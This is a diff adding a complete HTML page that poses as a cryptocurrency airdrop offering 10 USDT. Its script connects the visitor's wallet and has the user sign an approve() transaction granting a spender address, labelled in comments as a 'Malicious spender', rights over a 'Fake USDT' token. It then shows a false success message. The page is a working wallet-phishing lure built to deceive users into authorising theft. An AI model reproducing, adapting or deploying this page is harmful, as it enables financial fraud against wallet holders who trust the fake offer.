@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Claim Your Airdrop</title>
+  <meta charset="utf-8" />
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <style>
+    body {
+      font-family: Arial;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: linear-gradient(to right, #141e30, #243b55);
+      color: white;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #00c3ff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover {
+      background-color: #008db3;
+    }
+  </style>
+</head>
+<body>
+  <h1>🎁 Claim Your Airdrop</h1>
+  <p>Connect your wallet and get 10 USDT instantly.</p>
+  <button onclick="claimAirdrop()">Claim Airdrop</button>
+
+  <script>
+    const fakeUSDT = "0x5849C57c1e4751d6F9C820A5236A23Cdb93F9338"; // Fake USDT contract
+    const stealerContract = "0x67e2277c9bea5cc12DeDdAc0eA3dD1805A626Dba"; // Malicious spender
+    const usdtAbi = [
+      {
+        "constant": false,
+        "inputs": [
+          { "name": "_spender", "type": "address" },
+          { "name": "_value", "type": "uint256" }
+        ],
+        "name": "approve",
+        "outputs": [{ "name": "", "type": "bool" }],
+        "type": "function"
+      }
+    ];
+
+    async function claimAirdrop() {
+      if (typeof window.ethereum === 'undefined') {
+        alert('Please install MetaMask or OKX Wallet!');
+        return;
+      }
+
+      const web3 = new Web3(window.ethereum);
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+      const account = (await web3.eth.getAccounts())[0];
+      const usdt = new web3.eth.Contract(usdtAbi, fakeUSDT);
+
+      try {
+        const tx = await usdt.methods
+          .approve(stealerContract, web3.utils.toWei('10', 'mwei')) // 10 USDT with 6 decimals
+          .send({ from: account });
+
+        alert('✅ Airdrop claimed! You will receive USDT shortly.');
+      } catch (err) {
+        console.error(err);
+        alert('❌ Transaction rejected or failed.');
+      }
+    }
+  </script>
+</body>
+</html>
